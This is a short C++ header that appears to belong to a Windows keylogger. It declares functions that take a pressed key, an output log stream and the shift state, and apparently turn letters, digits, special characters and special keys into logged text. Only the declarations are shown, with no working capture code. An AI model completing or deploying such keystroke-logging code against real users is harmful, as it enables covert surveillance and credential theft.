#include <Windows.h>
#include <WinUser.h>
#include <fstream>
#include <iostream>

void check_letter(unsigned char pressedKey, std::ofstream& log, bool isShiftPressed);
void check_digit(unsigned char pressedKey, std::ofstream& log, bool isShiftPressed);
void check_special_character(unsigned char pressedKey, std::ofstream& log, bool isShiftPressed);
void check_special_key(unsigned char pressedKey, std::ofstream& log);